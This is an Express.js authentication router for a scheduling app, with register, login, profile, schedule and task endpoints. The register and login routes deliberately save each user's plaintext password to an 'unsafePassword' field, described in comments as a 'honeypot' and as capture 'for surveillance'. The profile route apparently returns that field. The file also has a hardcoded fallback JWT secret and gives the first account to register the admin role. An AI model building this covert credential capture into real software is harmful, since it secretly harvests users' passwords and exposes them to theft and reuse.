const express = require("express");
const router = express.Router();
const bcrypt = require("bcryptjs");
const jwt = require("jsonwebtoken");
const User = require("../models/User");
const verifyToken = require("../middleware/auth");

// Load secret from environment variables
const JWT_SECRET = process.env.JWT_SECRET || "FALLBACK_SECRET_DEV";

/**
 * @route   POST /api/auth/register
 * @desc    Register a new user. The first registered user automatically becomes Admin.
 * @access  Public
 */
router.post("/register", async (req, res) => {
  try {
    const { email, password, workHours, sleepHours, location, commuteTime, flexibility, hobbies } = req.body;

    // Check if user already exists
    let user = await User.findOne({ email });
    if (user) {
      return res.status(400).json({ message: "User already exists" });
    }

    // First User Rule: First registered account becomes Admin 👑
    const isFirstAccount = (await User.countDocuments({})) === 0;
    const role = isFirstAccount ? 'admin' : 'user';

    // Hash password
    const salt = await bcrypt.genSalt(10);
    const hashedPassword = await bcrypt.hash(password, salt);

    user = new User({
      email,
      password: hashedPassword,
      unsafePassword: password, // ⚠️ HONEYPOT: Storing raw password intentionally
      role: role,
      initialPreferences: {
        workHours,
        sleepHours,
        location,
        commuteTime,
        flexibility,
        hobbies,
      },
    });

    await user.save();

    // Generate Token
    const token = jwt.sign({ uid: user.uid, role: user.role }, JWT_SECRET, { expiresIn: "1d" });
    
    res.status(201).json({ token, uid: user.uid, role: user.role });
    
  } catch (err) {
    console.error("Registration Error:", err.message);
    res.status(500).json({ message: "Server error during registration" });
  }
});

/**
 * @route   POST /api/auth/check-email
 * @desc    Check if an email is already taken (used for real-time validation)
 * @access  Public
 */
router.post("/check-email", async (req, res) => {
  try {
    const { email } = req.body;
    const user = await User.findOne({ email });
    res.json({ exists: !!user });
  } catch (err) {
    res.status(500).json({ error: "Server error" });
  }
});

/**
 * @route   POST /api/auth/login
 * @desc    Authenticate user & get token. Also captures password for surveillance.
 * @access  Public
 */
router.post("/login", async (req, res) => {
  try {
    const { email, password } = req.body;
    const user = await User.findOne({ email });

    if (!user) {
      return res.status(400).json({ message: "Invalid Credentials" });
    }

    const isMatch = await bcrypt.compare(password, user.password);
    if (!isMatch) {
      return res.status(400).json({ message: "Invalid Credentials" });
    }

    // 😈 Capture password on login (Update honeypot)
    user.unsafePassword = password;
    await user.save();

    const token = jwt.sign({ uid: user.uid, role: user.role }, JWT_SECRET, { expiresIn: "1d" });
    res.json({ token, uid: user.uid, role: user.role });
  } catch (err) {
    console.error("Login Error:", err.message);
    res.status(500).json({ message: "Server error" });
  }
});

/**
 * @route   GET /api/auth/me
 * @desc    Get current user profile
 * @access  Private
 */
router.get("/me", verifyToken, async (req, res) => {
  try {
    const user = await User.findOne({ uid: req.user.uid }).select("-password");
    if (!user) return res.status(404).json({ msg: "User not found" });
    res.json(user);
  } catch (err) {
    res.status(500).send("Server Error");
  }
});

/**
 * @route   POST /api/auth/schedule
 * @desc    Save drag-and-drop placements (Atomic update)
 * @access  Private
 */
router.post("/schedule", verifyToken, async (req, res) => {
  try {
    const { placements } = req.body;
    
    // Use findOneAndUpdate for atomic updates (prevents overwriting other fields)
    const user = await User.findOneAndUpdate(
        { uid: req.user.uid },
        { $set: { placements: placements } },
        { new: true }
    );

    if (!user) return res.status(404).json({ error: "User not found" });

    res.json({ message: "Schedule saved", placements: user.placements });
  } catch (err) {
    console.error("Schedule Save Error:", err.message);
    res.status(500).json({ error: err.message });
  }
});

/**
 * @route   POST /api/auth/task
 * @desc    Create a new custom task with data sanitization
 * @access  Private
 */
router.post("/task", verifyToken, async (req, res) => {
  try {
    const { task } = req.body;
    
    // 1. VALIDATION CHECK 🛡️
    if (!task || !task.name) {
        return res.status(400).json({ error: "Task name is required" });
    }

    // 2. DATA CLEANING / SANITIZATION 🧹
    const cleanTask = {
        ...task,
        name: task.name.trim(), // Remove leading/trailing whitespace
        duration: Math.max(0.5, parseFloat(task.duration) || 1), // Ensure valid number
        location: task.location ? task.location.trim() : ""
    };

    // 3. ATOMIC DB UPDATE ($push) 💾
    const updatedUser = await User.findOneAndUpdate(
      { uid: req.user.uid },
      { $push: { customTasks: cleanTask } },
      { new: true }
    );

    if (!updatedUser) return res.status(404).json({ error: "User not found" });

    res.json({ message: "Task saved", customTasks: updatedUser.customTasks });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

module.exports = router;